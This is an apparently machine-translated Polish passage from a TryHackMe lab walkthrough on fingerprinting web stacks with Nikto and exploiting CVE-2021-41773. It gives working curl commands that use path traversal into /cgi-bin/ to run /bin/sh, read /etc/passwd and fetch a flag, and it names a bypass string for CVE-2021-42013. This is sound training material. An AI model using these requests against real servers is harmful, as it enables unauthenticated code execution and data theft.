Apache 2.4.49 wprowadził zmianę w `ap_normalize_path()`funkcji. Zmiana ta nieumyślnie uszkodziła filtr przechodzenia ścieżki. ZwykleApaczblokuje każdy adres URL zawierający kod `../`przed dotarciem do systemu plików. Błąd dotyczy kolejności dekodowania: filtr przechodzenia działa przed pełnym dekodowaniem adresu URL.

Gdy wysyłasz `.%2e/`(kropkę, po której następuje kropka zakodowana w adresie URL i ukośnik), filtr widzi `.%2e/`ją i nie rozpoznaje jako `../`. Gdy Apache przekazuje adres URL do systemu plików, system operacyjny interpretuje ją `.%2e/`jako `../`. Filtr został pominięty.

Samo w sobie jest to przeglądanie katalogów w celu odczytu pliku. Krytyczna jest interakcja z `mod_cgi`. `/cgi-bin/`Ścieżka ma włączone wykonywanie CGI. Gdy przeglądanie prowadzi do pliku wykonywalnego, takiego jak `/bin/sh`, Apache uruchamia go jako skrypt CGI i przekazuje `POST`treść HTTP do swojego wejścia standardowego.

**Dlaczego `--path-as-is`jest to wymagane**

Curl normalizuje adresy URL przed ich wysłaniem. Bez tej opcji `--path-as-is`, curl czyści `.%2e/`sekwencje przed wysłaniem żądania z komputera, a serwer otrzymuje normalną ścieżkę. Flaga ta nakazuje curlowi wysłanie adresu URL dokładnie w takiej postaci, w jakiej został wpisany.

![](https://tryhackme-images.s3.eu-west-1.amazonaws.com/room-icons/68d2c1e7ab94268f6271de1d-1771765214579)

**Ostrzeżenie:** Jeżeli żądania przechodzenia zwracają kod 403 zamiast zostać wykonane, najczęstszą przyczyną jest brakująca `--path-as-is`flaga. curl po cichu normalizuje sekwencje przechodzenia, a serwer nigdy nie widzi zakodowanych kropek.

## Eksploatacja 

Potwierdzono, że Apache 2.4.49 jest na porcie `8080`, z `mod_cgi`włączonym `/cgi-bin/`. Masz bezpośrednią ścieżkę do nieuwierzytelnionego RCE.

**Krok 1: Potwierdź wykonanie kodu zdalnego**

Przejście z `/cgi-bin/`maksymalnie `/bin/sh`czterech `.%2e/`segmentów. Przekazanie poleceń powłoki w treści POST. `echo Content-Type: text/plain; echo;`Preambuła jest wymagana przez specyfikację CGI. Apache wymaga prawidłowego bloku nagłówka HTTP przed treścią, w przeciwnym razie zwróci kod 500. `echo`Polecenie Bare wyświetla wymagany pusty wiersz separatora:

Terminal

```shell-session
root@tryhackme:~# curl -s --path-as-is "http://10.130.164.251:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"   --data 'echo Content-Type: text/plain; echo; id'
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

RCE potwierdzone. Proces Apache działa jako `daemon`. Kod jest wykonywany na serwerze z uprawnieniami procesu webowego.

**Krok 2: Odczyt kont systemowych**

Dzięki wykonaniu kodu możesz odczytać dowolny plik, do którego `daemon`użytkownik ma dostęp. Odczyt `/etc/passwd`umożliwia wyliczenie kont systemowych w kontenerze:

Terminal

```shell-session
root@tryhackme:~# curl -s --path-as-is "http://10.130.164.251:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"   --data 'echo Content-Type: text/plain; echo; cat /etc/passwd'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
...
```

Pierwsze konto inne niż root to `daemon`konto tego samego użytkownika, który uruchamia proces Apache. To potwierdza, że ​​serwer nie działa jako `root`.

**Krok 3: Przeczytaj flagę**

Terminal

```shell-session
root@tryhackme:~# curl -s --path-as-is "http://10.130.164.251:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"   --data 'echo Content-Type: text/plain; echo; cat /flag.txt'
[REDACTED]
```

![](https://tryhackme-images.s3.eu-west-1.amazonaws.com/room-icons/68d2c1e7ab94268f6271de1d-1771765216406)

**Informacja:** CVE-2021-41773 jest specyficzny dla danej wersji. Dotyczy tylko Apache 2.4.49. Częściowa poprawka w wersji 2.4.50 blokowała pojedyncze kodowanie kropek, ale nie podwójne kodowanie. CVE-2021-42013 śledzi obejście za pomocą `%%32%65%%32%65/`. Wersje 2.4.51 i nowsze są w pełni załatane. Każdy nagłówek `Server: Apache/2.4.49`lub `Server: Apache/2.4.50`jest natychmiastowym sygnałem, aby sięgnąć po tę opcję.CVE.

Odpowiedz na poniższe pytania

Jaka konkretna wartość nagłówka serwera identyfikuje ten cel jako podatny na atak CVE-2021-41773? (Format odpowiedzi: Apache/XXXX (OS)

Ręczne odciski palców pokazują, które sygnały są ważne i dlaczego. Podczas pracy w zakresie z wieloma hostami, Nikto zapewnia szybki pierwszy przebieg; sonduje każdą usługę, odczytuje nagłówki odpowiedzi i wyświetla sygnały stosu oraz znane błędy konfiguracji bez konieczności pisania ani jednego ładunku.

## Skanowanie wszystkich czterech stosów

Uruchom Nikto na każdym porcie po kolei: MERN na porcie  `3000`, Next.js na porcie `3001`, Django na porcie `8000`i Apache na porcie `8080`.

**Port 3000 – stos MERN**

Terminal

```shell-session
root@tryhackme:~# nikto -h http://10.130.164.251:3000

- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.130.164.251
+ Target Hostname:    10.130.164.251
+ Target Port:        3000
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ Cookie connect.sid created without the httponly flag
+ Retrieved x-powered-by header: Express
+ The anti-clickjacking X-Frame-Options header is not present.
+ Uncommon header 'content-security-policy' found, with contents: default-src 'none'
+ Allowed HTTP Methods: GET, HEAD
+ 6544 items checked: 0 error(s) and 7 item(s) reported on remote host
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Brak `Server:`baneru; Express domyślnie go nie wysyła. Dwa sygnały potwierdzają stos: `x-powered-by: Express`i plik `connect.sid`cookie sesji. Brak `httponly`flagi naplik cookie sesjijest dodatkowym odkryciem.

**Port 3001 - Next.js**

Terminal

```shell-session
root@tryhackme:~# nikto -h http://10.130.164.251:3001

- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.130.164.251
+ Target Hostname:    10.130.164.251
+ Target Port:        3001
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ Retrieved x-powered-by header: Next.js
+ Uncommon header 'x-nextjs-stale-time' found, with contents: 4294967294
+ Uncommon header 'x-nextjs-cache' found, with contents: HIT
+ Uncommon header 'x-nextjs-prerender' found, with contents: 1
+ Allowed HTTP Methods: HEAD
+ 6544 items checked: 0 error(s) and 19 item(s) reported on remote host
---------------------------------------------------------------------------
+ 1 host(s) tested
```

`x-powered-by: Next.js`potwierdza strukturę. Trzy `x-nextjs-*`nagłówki potwierdzają, że App Router jest w trybie produkcyjnym, co jest warunkiem koniecznym do zastosowania CVE-2025-29927.

**Port 8000 - Django**

Terminal

```shell-session
root@tryhackme:~# nikto -h http://10.130.164.251:8000

- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.130.164.251
+ Target Hostname:    10.130.164.251
+ Target Port:        8000
---------------------------------------------------------------------------
+ Server: WSGIServer/0.2 CPython/3.10.12
+ Uncommon header 'referrer-policy' found, with contents: same-origin
+ Uncommon header 'x-content-type-options' found, with contents: nosniff
+ 6544 items checked: 0 error(s) and 4 item(s) reported on remote host
---------------------------------------------------------------------------
+ 1 host(s) tested
```

`WSGIServer/0.2 CPython/3.10.12`to baner serwera specyficzny dla Django. Połączenie `referrer-policy: same-origin`i `x-content-type-options: nosniff`potwierdza, że ​​Django `SecurityMiddleware`jest aktywny.

**Port 8080 - Apache**

Terminal

```shell-session
root@tryhackme:~# nikto -h http://10.130.164.251:8080

- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.130.164.251
+ Target Hostname:    10.130.164.251
+ Target Port:        8080
---------------------------------------------------------------------------
+ Server: Apache/2.4.49 (Unix)
+ Server leaks inodes via ETags, header found with file /
+ The anti-clickjacking X-Frame-Options header is not present.
+ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS, TRACE
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ 6544 items checked: 0 error(s) and 4 item(s) reported on remote host
+ End Time: (9 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

`Server: Apache/2.4.49 (Unix)`jest bezpośredniCVEWskaźnik -2021-41773. To najcenniejszy wynik uzyskany przez Nikto we wszystkich czterech skanach: dokładny numer wersji, który odpowiada znanemu krytycznemu exploitowi.

Nikto zidentyfikował stos na każdym porcie w niecałą minutę.Apacz, podała Ci również dokładną wersję, bez konieczności dalszego odciskania palca.MERNW przypadku Django stos jest potwierdzony, ale Nikto nie ma szablonów dla luk w zabezpieczeniach na poziomie aplikacji. W tym miejscu sprawdzają się ręczne techniki z zadań 2 i 4.

Udało Ci się zidentyfikować cztery stosy i wykorzystać cztery luki w zabezpieczeniach CVE, stosując za każdym razem ten sam trzyetapowy proces: odczytaj sygnały, potwierdź wersję, wykonaj łańcuch.

## CVE Streszczenie

|Stos|CVE|Uderzenie|CVSS|
|---|---|---|---|
|MERN/ Ekspres|CVE-2020-8203|Zanieczyszczenie prototypu → obejście uwierzytelniania|7.4 Wysoki|
|Oprogramowanie pośredniczące Next.js|CVE-2025-29927|Pojedynczy nagłówek → pełne obejście oprogramowania pośredniczącego|9.1 Krytyczne|
|DjangoORM|CVE-2021-35042|SQLwtrysk przez nieparametryzowane`ORDER BY`|9.8 Krytyczne|
|Apache LAMP|CVE-2021-41773|Przejście ścieżki +`mod_cgi` RCE|9.8 Krytyczne|

## Najważniejsze wnioski

Każdy stos ujawnia swoją tożsamość. Kiedy już odczytasz te sygnały, przestajesz zgadywać i zaczynasz celować. Właśnie dla takiej zmiany powstało to pomieszczenie. Jako tester penetracyjny, zawsze powinieneś skupić się na zrozumieniu, _dlaczego_ istnieje luka, zanim sięgniesz po exploit. Każdy odczytany sygnał, każdy nagłówek, który sprawdzasz, i każda wersja, którą potwierdzasz, przybliża Cię do ukierunkowanego, opartego na dowodach łańcucha ataków, a nie do zaszumionego skanowania.

Bądźcie czujni, bo wkrótce pojawi się więcej ciekawych pokoi.
